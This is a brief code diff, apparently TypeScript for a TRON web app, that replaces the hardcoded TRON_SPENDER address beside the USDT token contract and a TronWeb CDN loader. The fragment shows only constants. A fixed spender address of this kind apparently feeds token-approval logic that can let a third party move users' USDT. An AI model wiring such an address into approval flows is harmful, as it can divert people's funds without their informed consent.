@@ -17,7 +17,7 @@ declare global {
 
 const PROJECT_ID   = "6b5df56bc30c1dadaab59498b86fd3e8";
 const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
+const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";
 
 // ✅ TronWeb CDN se load — singleton promise
 let _twPromise: Promise<any> | null = null;
